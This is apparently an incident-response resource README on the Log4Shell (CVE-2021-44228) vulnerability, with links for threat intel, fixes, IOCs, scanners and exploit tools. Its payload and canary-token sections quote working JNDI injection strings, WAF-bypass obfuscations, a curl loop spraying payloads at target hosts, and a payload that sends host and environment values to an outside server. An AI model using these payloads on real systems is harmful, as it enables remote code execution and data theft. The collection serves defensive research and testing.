## CVE-2021-44228: log4j / log4shell Security Research Summary

This repository contains all gathered resources we used during our Incident Reponse on CVE-2021-44228 aka log4shell.

### Threat Intel
| URL | Info |
| --- | --- |
| https://musana.net/2021/12/13/log4shell-Quick-Guide/ | log4shell-Quick-Guide |
| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228 | MITRE CVE-2021-44228 |
| https://www.bsi.bund.de/SharedDocs/Cybersicherheitswarnungen/DE/2021/2021-549032-10F2.pdf?__blob=publicationFile&v=6 | BSI Warning |
| https://github.com/NCSC-NL/log4shell | Netherlands CERT Roundup |
| https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/ | Switzerland CERT roundup |
| https://www.lunasec.io/docs/blog/log4j-zero-day/ | Lunasec log4shell roundup |
| https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java | Huntress log4shell roundup |
| https://zero.bs/sb-2121-log4j-rce-cve-2021-44228.html | zeroBS log4shell roundup |
| https://www.bleepingcomputer.com/news/security/new-zero-day-exploit-for-log4j-java-library-is-an-enterprise-nightmare/ | Bleepingcomputer - Vulnerable Log4j library |
| https://www.bleepingcomputer.com/news/security/researchers-release-vaccine-for-critical-log4shell-vulnerability/ | Bleepingcomputer - Researchers release 'vaccine' for critical Log4Shell vulnerability |
| https://github.com/YfryTchsGD/Log4jAttackSurface | YfryTchsGD - Attack Surface |
| https://github.com/NCSC-NL/log4shell/tree/main/software | Netherland CERT - Affected log4j versions |
| https://logging.apache.org/log4j/2.x/security.html | apache.org - Log4j Security Vulnerabilities |
| https://twitter.com/marcioalm/status/1470361495405875200?s=09 | Twitter - JNDI-Exploit-Kit targets ANY version of Java! |

### Mitigations / Fixes
| URL | Info |
| --- | --- |
| https://github.com/apache/logging-log4j2/pull/607 | GitHub - LOG4J2-3198: Log4j2 no longer formats lookups in messages by default #607 |
| https://github.com/apache/logging-log4j2/pull/608#issuecomment-991723301 | log4j2 pull request  |
| https://issues.apache.org/jira/browse/LOG4J2-3198 | apache.org - LOG4J2-3198 |
| https://logging.apache.org/log4j/2.x/changes-report.html#a2.16.0 | apache.org - Disable JNDI by default. Fixes LOG4J2-3208, LOG4J2-3211 |
| https://github.com/apache/logging-log4j2/pull/608#issuecomment-993542299 | Restrict LDAP access via JNDI #608 |
| https://issues.apache.org/jira/browse/LOG4J2-3221 | JNDI lookups in layout (not message patterns) enabled in Log4j2 < 2.16.0 |

<p align="center">
  <img width="800" height="450" src="https://github.com/0xsyr0/CVE-2021-44228-log4j-log4shell-Security-Research-Summary/blob/main/files/log4j_attack.png">
</p>

Source: https://www.govcert.ch/blog/zero-day-exploit-targeting-popular-java-library-log4j/

### Malware Incidents
| URL | Info |
| --- | --- |
| https://twitter.com/80vul/status/1470272820571963392?s=20 | Twitter - Bad news Ransomware has landed on #log4j2 RCE |

### Advisory
| URL | Info |
| --- | --- |
| https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592 | BlueTeam CheatSheet *Log4Shell* |
| https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/ | Guidance for preventing, detecting, and hunting for CVE-2021-44228 Log4j 2 exploitation |

### IOCs / Callback URLs and IP addresses
| URL | Info |
| --- | --- |
| https://gist.github.com/superducktoes/9b742f7b44c71b4a0d19790228ce85d8 | Callback Domains for log4j |
| https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/Log4j_IOC_List.csv | Azure-Sentinel |
| https://github.com/curated-intel/Log4Shell-IOCs | Log4Shell-IOCs |
| https://github.com/mubix/CVE-2021-44228-Log4Shell-Hashes | Log4Shell-Hashses |
| https://www.virustotal.com/gui/collection/04c6ab336e767ae9caee992902c4f3039ccee24df7458cd7cbaf3182644b3044/iocs | VirusTotal IOCs |
| https://samples.vx-underground.org/samples/Families/Log4J%20Malware/ | Driveby Malware Samples (Password: infected) |

### Public Honeypots
| URL | Info |
| --- | --- |
| https://isc.sans.edu/api/webhoneypotreportsbyua/jndi | SANS jndi Honeypot |

### Payloads / Obfuscation / WAF Bypass
| URL | Info |
| --- | --- |
| https://gist.github.com/ZephrFish/32249cae56693c1e5484888267d07d39 | log4j payloads |
| https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a | log4j-keywords |

#### Social Media Payload Responses
If you're filtering on "ldap", "jndi", or the ${lower:x} method, I have bad news for you:
```c
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}
```
// attacker.com/a} This gets past every filter I've found so far. There's no shortage of these bypasses.

Source: https://twitter.com/Rezn0k/status/1469523006015750146?s=09

---

There may be many ways to avoid detection :(
```c
jn${env::-}di: jn${date:}di${date:':'} j${k8s:k5:-ND}i${sd:k5:-:} j${main:\k5:-Nd}i${spring:k5:-:} j${sys:k5:-nD}${lower:i${web:k5:-:}} j${::-nD}i${::-:} j${EnV:K5:-nD}i: j${loWer:Nd}i${uPper::}
```

Source: https://twitter.com/ymzkei5/status/1469765165348704256?s=09

---

1. `${jndi:ldap://127.0.0.1:1389/ badClassName}`
2. `${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}`
3. `${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}`
4. `${jndi:rmi://adsasd.asdasd.asdasd}`

Source: https://twitter.com/ymzkei5/status/1469765165348704256?s=09

#### Canary Token Testing
```c
cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "X-Api-Version: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}" -H "User-Agent: ${jndi:[ldap://TOKEN.canarytokens.com/a](ldap://TOKEN.canarytokens.com/a)}";done
```
```c
${jndi:ldap://${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}..[L4J.TOKEN.canarytokens.com/a](http://l4j.TOKEN.canarytokens.com/a)}  
test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.[L4J.TOKEN.canarytokens.com/a})@foobar.com](http://l4j.TOKEN.canarytokens.com/a%7D)@foobar.com)
```
RFC conform Email Payload:
```c
test+(${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//${hostName}.${env:COMPUTERNAME}.${env:USERDOMAIN}.${env}.L4J.TOKEN.canarytokens.com/a})@foobar.com
```

Triggering the Canary Token by using User-Agent Switcher:
URL: https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/
Payload: `${jndi:ldap://TOKEN.canarytokens.com/a}`

Fire in the hole aka start browsing the web!

### Vulnerability Scanning
| URL | Info |
| --- | --- |
| https://canarytokens.org/generate# | Canary Tokens |
| https://gist.github.com/Neo23x0/e4c8b03ff8cdf1fa63b7d15db6e3860b | # log4j RCE Exploitation Detection |
| https://github.com/Neo23x0/log4shell-detector | log4shell-detector |
| https://github.com/fullhunt/log4j-scan | log4j-scan |
| https://github.com/r0mdau/ansible-role-log4shell-detector | ansible-role-log4shell-detector |
| https://github.com/Cybereason/Logout4Shell | Logout4Shell |
| https://github.com/dtact/divd-2021-00038--log4j-scanner | divd-2021-00038--log4j-scanner |

### Exploitation
| URL | Info |
| --- | --- |
| https://github.com/welk1n/JNDI-Injection-Exploit | JNDI-Injection-Exploit |
| https://github.com/pimps/JNDI-Exploit-Kit | JNDI-Exploit-Kit |
| https://github.com/mbechler/marshalsec | marshalsec |
| https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java | marshalsec malicious LDAP server |
